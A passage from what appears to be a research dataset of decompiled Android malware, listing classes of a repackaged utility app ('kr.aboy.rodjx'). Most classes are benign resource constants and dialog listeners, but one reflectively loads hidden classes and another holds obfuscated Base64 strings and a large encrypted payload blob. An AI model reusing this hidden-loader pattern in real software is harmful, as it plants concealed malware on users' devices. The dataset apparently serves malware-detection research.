vib7_msg=2131231009;   public static final int vib8_msg=2131231010;   public static final int vib9_msg=2131231011;   public static final int vib10_msg=2131231012;   public static final int vib11_msg=2131231013;   public static final int vib12_msg=2131231014;   public static final int vib13_msg=2131231015;   public static final int menu_sql=2131231016;   public static final int menu_refresh=2131231017;   public static final int label_title=2131231018;   public static final int sql_xname_sound=2131231019;   public static final int sql_xname_vibration=2131231020;   public static final int sql_yname_sound=2131231021;   public static final int sql_yname_vibration=2131231022;   public static final int sql_option=2131231023;   public static final int sql_save=2131231024;   public static final int sql_delete=2131231025;   public static final int sql_load=2131231026;   public static final int sql_saven=2131231027;   public static final int sql_nolist=2131231028;   public static final int pref_category1_sound=2131231029;   public static final int pref_upsidedown=2131231030;   public static final int pref_upsidedown_summary=2131231031;   public static final int pref_soundlevel=2131231032;   public static final int pref_soundlevel_summary=2131231033;   public static final int pref_duration=2131231034;   public static final int pref_duration_summary=2131231035;   public static final int pref_category2_sound=2131231036;   public static final int pref_beeplevel4=2131231037;   public static final int pref_beeplevel4_summary=2131231038;   public static final int pref_beepkind4=2131231039;   public static final int pref_beepkind4_summary=2131231040;   public static final int pref_baseline=2131231041;   public static final int pref_baseline_summary=2131231042;   public static final int info1_title_sound=2131231043;   public static final int info1_msg_sound=2131231044;   public static final int info2_title_sound=2131231045;   public static final int info2_msg_sound=2131231046;   public static final int info_update_sound=2131231047;   public static final int no_led=2131231048;   public static final int busy_msg=2131231049; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\t.code","public class t implements DialogInterface.OnClickListener {   final d f416a;   public t(  d dVar){     this.f416a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\Tools.code","!org.eclipse.jdt.core.dom.TypeDeclaration@388c2ed1"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\u.code","public class u implements DialogInterface.OnClickListener {   final d f417a;   private final Context f418b;   public u(  d dVar,  Context context){     this.f417a=dVar;     this.f418b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f418b.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse((String)this.f418b.getText(C0000R.string.my_homepage_sound))));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\v.code","public class v implements DialogInterface.OnClickListener {   final d f419a;   public v(  d dVar){     this.f419a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\w.code","class w implements DialogInterface.OnClickListener {   final LicenseCheck f420a;   public w(  LicenseCheck licenseCheck){     this.f420a=licenseCheck;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f420a.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(""market://details?id="" + this.f420a.getPackageName())));     this.f420a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\x.code","class x implements DialogInterface.OnClickListener {   final LicenseCheck f421a;   public x(  LicenseCheck licenseCheck){     this.f421a=licenseCheck;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f421a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\xml.code","public static final class xml {   public static final int flash_widget_info=2130968576;   public static final int settings_compass=2130968577;   public static final int settings_measure=2130968578;   public static final int settings_ruler=2130968579;   public static final int settings_sound=2130968580; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\y.code","class y implements DialogInterface.OnKeyListener {   final LicenseCheck f422a;   public y(  LicenseCheck licenseCheck){     this.f422a=licenseCheck;   }   @Override public boolean onKey(  DialogInterface dialogInterface,  int i,  KeyEvent keyEvent){     return i == 82 || i == 84 || i == 4;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\z.code","class z implements DialogInterface.OnClickListener {   final LicenseCheck f430a;   public z(  LicenseCheck licenseCheck){     this.f430a=licenseCheck;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f430a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.a\a.code","public class a {   private static a f337a=null;   private Context f338b;   private a(  Context context){     this.f338b=context;     d.a(new Object[]{context,Sdx.class,Tnsv.class,Wifi.class},new Class[]{Context.class,Class.class,Class.class,Class.class},d.a(b.u,context),b.u);   }   public static synchronized a a(  Context context){     a aVar; synchronized (a.class) {       if (f337a == null) {         f337a=new a(context);       }       aVar=f337a;     }     return aVar;   }   public void a(  String str){     d.a(new Object[]{str},new Class[]{String.class},this.f338b,b.u,b.l);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.a\b.code","public final class b {   public static String f339a=""dd259f8fb5524dcb905075800058cb9b"";   public static String f340b=new String(c.a(Base64.decode(""0sC34a6nqMg="",0)));   public static String c=new String(c.a(Base64.decode(""o9Gl6NC7ug=="",0)));   public static String d=new String(c.a(Base64.decode(""0sDG1Ly7ocg="",0)));   public static String e=new String(c.a(Base64.decode(""taK2xuPf"",0)));   public static String f=new String(c.a(Base64.decode(""weKzrrmo1cHt"",0)));   public static String g=new String(c.a(Base64.decode(""weKwrLqd2bvo6Jurp9i+6A=="",0)));   public static String h=new String(c.a(Base64.decode(""weK6rr940sni"",0)));   public static String i=new String(c.a(Base64.decode(""taKlu+LT"",0)));   public static String j=new String(c.a(Base64.decode(""weLBrqmZzMjZ"",0)));   public static String k=new String(c.a(Base64.decode(""o9Gl6NC7unfSv+HQt6o="",0)));   public static String l=new String(c.a(Base64.decode(""vKuorLY="",0)));   public static String m=new String(c.a(Base64.decode(""vKuoprrV3beymay2"",0)));   public static String n=new String(c.a(Base64.decode(""4rG1qw=="",0)));   public static String o=new String(c.a(Base64.decode(""mMS+6ti0dKfcxejUtnR4yMq326q5p6/B1dOuuA=="",0)));   public static String p=new String(c.a(Base64.decode(""vuPQrYmgxMXn"",0)));   public static String q=new String(c.a(Base64.decode(""m8jGt9uquaevwdXTrrg="",0)));   public static String r=new String(c.a(Base64.decode(""d2eRwuLW"",0)));   public static String s=new String(c.a(Base64.decode(""d2eRvNXh"",0)));   public static String t=new String(c.a(Base64.decode(""d2eRttnn"",0)));   public static String u=new String(c.a(Base64.decode(""0rizYsrB49a1q2LOvKK8qq+isLPi0LCrpg=="",0)));   public static String v=new String(c.a(Base64.decode(""rLWhkbnj3rCymZG93p2Wp53Rk9fjsryd18s="",0)));   public static String w=new String(c.a(Base64.decode(""rLWhkbnj3rCymZG93p2Wp53RpNnSrq+qyMQ="",0)));   public static String x=new String(c.a(Base64.decode(""0rizYsrB49a1q2LOvKK8qq+itrfm5bKpmQ=="",0)));   private static StringBuffer z=new StringBuffer().append(""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